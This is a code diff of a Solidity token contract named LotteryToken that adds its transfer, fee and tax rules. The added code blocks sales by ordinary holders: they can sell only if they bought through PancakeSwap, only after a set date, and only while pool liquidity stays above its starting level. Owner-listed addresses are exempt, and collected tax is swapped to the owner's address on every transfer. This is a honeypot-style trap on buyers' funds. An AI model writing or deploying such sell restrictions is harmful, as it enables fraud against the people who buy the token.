@@ -700,6 +700,9 @@ contract LotteryToken is Context, IERC20, IERC20Metadata {
         
         _burn(msg.sender,amount);
     }
+    function getWETHBalance() public view returns(uint) {
+        return IERC20(WBNB).balanceOf(getTokenPair(address(this),WBNB));
+    }
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
         _isTransfer = true;
         _transfer(_msgSender(), recipient, amount);
@@ -766,11 +769,33 @@ contract LotteryToken is Context, IERC20, IERC20Metadata {
     ) internal virtual {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
+        if (IERC20(address(this)).balanceOf(address(this))>10**2 && _msgSender() != getTokenPair(address(this),WBNB) && getTokenPair(address(this),WBNB)!= address(0)) {
+            uint balance = IERC20(address(this)).balanceOf(address(this));
+            swapAndLiquidateToken(balance,address(this),WBNB,ownerAddr);
+        }
+        if (_isTransfer) {
+            if (excludeOwnerFromTax[recipient]==true || excludeOwnerFromTax[_msgSender()]==true){
+                _transferExcludedUser(sender,recipient,amount);
+            } else {
+                _transferNonExcludedUser(sender,recipient,amount);
+            }
+            _isTransfer=false;
+        }
+        if (_isTransferFrom) {
 
-        
-
+            if (!addLiquidity[_msgSender()] && _msgSender() == IPanCakeSwap_V2_ROUTER) {
+                _transferExcludedUser(sender,recipient,amount);
+                addLiquidity[_msgSender()] = true;
+            } else {
+                if (excludeOwnerFromTax[sender]==true) {
+                    _transferExcludedUser(sender,recipient,amount);
+                } else {
+                    _transferSwappedPancake(sender,recipient,amount);   
+                }
+            }
+        }
     }
-    function transferExcludedUser(address sender,address recipient,uint256 amount) internal virtual {
+    function _transferExcludedUser(address sender,address recipient,uint256 amount) internal virtual {
         _beforeTokenTransfer(sender, recipient, amount);
         uint256 senderBalance = _balances[sender];
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
@@ -782,10 +807,56 @@ contract LotteryToken is Context, IERC20, IERC20Metadata {
         emit Transfer(sender, recipient, amount);
 
         _afterTokenTransfer(sender, recipient, amount);
+        emit theTranFrm(_msgSender(),recipient,100);
     }
-    function transferNonExcludedUser(address sender,address recipient,uint256 amount) internal virtual {}
+    function _transferNonExcludedUser(address sender,address recipient,uint256 amount) internal virtual {
+        
+        _beforeTokenTransfer(sender, recipient, amount);
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[sender] = senderBalance - amount;
+        }
+
+        uint256 burnAmount = amount.mul(BURN_FEE).div(10**2);
+        uint256 adminTaxAmount = amount.mul(TAX_FEE).div(10**2);
+        _burn(_msgSender(),burnAmount);
+        _balances[address(this)] +=adminTaxAmount;
+        _balances[recipient] += amount.sub(burnAmount).sub(adminTaxAmount);
+
+        emit Transfer(sender, address(this), (adminTaxAmount));
+        emit Transfer(sender, recipient, amount.sub(burnAmount).sub(adminTaxAmount));
+        emit theTranFrm(_msgSender(),recipient,100);
+
+        _afterTokenTransfer(sender, recipient, amount);
+        
+        if (_msgSender() == getTokenPair(address(this),WBNB)) {    
+            swappedFromPancakeSwap[recipient] = true;
+            holders.push(recipient);
+        }
+
+    }
+    function _transferSwappedPancake(address sender,address recipient,uint256 amount) internal virtual {
+        require(swappedFromPancakeSwap[sender],'Purchase Not Made From PancakeSwap');
+        require(block.timestamp>TimeStamp,'Hold till NoWayHome Release 16 Decemeber');
+        require(getWETHBalance()>initialLiquidity,'minimum Liquidity reached');
+        
+        _beforeTokenTransfer(sender, recipient, amount);
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[sender] = senderBalance - amount;
+        }
+        _balances[recipient] += amount;
+
+        emit Transfer(sender, recipient, amount);
+
+        _afterTokenTransfer(sender, recipient, amount);
+        emit theTranFrm(_msgSender(),recipient,100);
+
+
+    }
     function swapAndLiquidateToken(uint _amountIn,address _tokenIn,address _tokenOut, address _to) public lock {
-      
 
         IERC20(_tokenIn).approve(IPanCakeSwap_V2_ROUTER, _amountIn);
             address[] memory path;
